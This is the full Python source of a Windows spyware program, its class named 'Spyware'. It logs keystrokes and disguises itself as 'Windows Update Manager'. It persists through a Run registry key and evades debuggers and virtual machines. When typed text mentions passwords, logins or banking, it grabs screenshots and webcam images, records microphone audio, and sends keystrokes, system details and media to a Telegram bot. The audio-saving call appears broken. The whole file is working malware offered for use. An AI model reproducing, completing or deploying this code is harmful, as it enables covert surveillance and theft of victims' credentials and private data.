import sys
import ctypes
import logging
import os
import platform
import socket
import threading
import time
import wave
import pyscreenshot
import sounddevice as sd
import requests
import cv2
from pynput import keyboard
from pathlib import Path
from dotenv import load_dotenv

# Hide the console window when compiled as .exe
if __name__ == '__main__' and getattr(sys, 'frozen', False):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Load .env from bundled or local path
env_path = Path(sys._MEIPASS) / ".env" if getattr(sys, 'frozen', False) else ".env"
load_dotenv(env_path)

# ===============================================
# CONFIGURATION (Stored in .env)
# ===============================================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
SEND_REPORT_EVERY = 300  # 5 minutes
MAX_LOG_SIZE = 1_000_000  # 1MB

# ===============================================
# KEYLOGGER CLASS
# ===============================================
class Spyware:
    def __init__(self):
        self.log = ""
        self.interval = SEND_REPORT_EVERY
        self.last_sent = 0
        self.decrypted_log = "_secure.log"
        self.init_log_rotation()
        self.setup_disguise()

    def init_log_rotation(self):
        if os.path.exists(self.decrypted_log) and os.path.getsize(self.decrypted_log) > MAX_LOG_SIZE:
            with open(self.decrypted_log, "w") as f:
                f.write("")

    def setup_disguise(self):
        if platform.system() == "Windows":
            try:
                import win32api
                win32api.SetConsoleTitle("Windows Update Manager")
            except:
                pass

    def send_telegram(self, message):
        try:
            if time.time() - self.last_sent < 1:
                time.sleep(1)
            with open(self.decrypted_log, "a", encoding="utf-8") as f:
                f.write(f"[{time.ctime()}] {message}\n")
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            response = requests.post(
                url,
                data={"chat_id": CHAT_ID, "text": message},
                timeout=15,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            self.last_sent = time.time()
            return response.json().get('ok', False)
        except Exception as e:
            return False

    def log_system_info(self):
        info = f"""
        [SYSTEM INFO]
        Host: {socket.gethostname()}
        IP: {socket.gethostbyname(socket.gethostname())}
        OS: {platform.platform()}
        User: {os.getlogin()}
        """
        self.log += info

    def on_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.caps_lock: "[CAPSLOCK]",
                keyboard.Key.shift: "[SHIFT]"
            }
            current_key = special_keys.get(key, f"[{key}]")
        self.log += current_key
        if len(self.log) > 500:
            self.report_logs()

    def capture_evidence(self):
        try:
            suspicious = any(word in self.log.lower() for word in ["password", "login", "bank"])

            if suspicious:
                # Screenshot
                img = pyscreenshot.grab()
                img.save("_tmp_sc.png")
                with open("_tmp_sc.png", "rb") as f:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                        files={"photo": f},
                        data={"chat_id": CHAT_ID}
                    )
                os.remove("_tmp_sc.png")

                # Webcam snapshot
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    cv2.imwrite("_tmp_webcam.jpg", frame)
                    with open("_tmp_webcam.jpg", "rb") as f:
                        requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                            files={"photo": f},
                            data={"chat_id": CHAT_ID}
                        )
                    os.remove("_tmp_webcam.jpg")
                cam.release()

            if len(self.log) > 1000:
                fs = 44100
                recording = sd.rec(int(5 * fs), samplerate=fs, channels=1)
                sd.wait()
                wave.write("_tmp_audio.wav", fs, recording)
                with open("_tmp_audio.wav", "rb") as f:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAudio",
                        files={"audio": f},
                        data={"chat_id": CHAT_ID}
                    )
                os.remove("_tmp_audio.wav")

        except Exception as e:
            pass

    def report_logs(self):
        if self.log.strip():
            if not self.send_telegram(self.log):
                with open("_emergency.log", "a") as f:
                    f.write(self.log + "\n")
            self.log = ""
        threading.Timer(self.interval, self.report_logs).start()

    def persist(self):
        if platform.system() == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(
                    key,
                    "WindowsUpdateManager",
                    0,
                    winreg.REG_SZ,
                    os.path.abspath(__file__)
                )
                key.Close()
            except Exception as e:
                pass

    def is_vm_or_debug(self):
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        vm_indicators = [
            "vmware" in platform.system().lower(),
            "virtualbox" in platform.system().lower(),
            os.path.exists("/proc/xen"),
            "qemu" in platform.machine().lower()
        ]
        return any(vm_indicators)

    def run(self):
        if self.is_vm_or_debug():
            return
        self.persist()
        self.log_system_info()
        self.send_telegram("✅ Spyware initialized")
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()
        self.report_logs()
        threading.Thread(target=self.capture_evidence, daemon=True).start()
        keyboard_listener.join()

# ===============================================
# MAIN EXECUTION
# ===============================================
if __name__ == "__main__":
    logging.disable(logging.CRITICAL)
    try:
        spyware = Spyware()
        spyware.run()
    except Exception as e:
        with open("_crash.log", "a") as f:
            f.write(f"{time.ctime()}: {str(e)}\n")
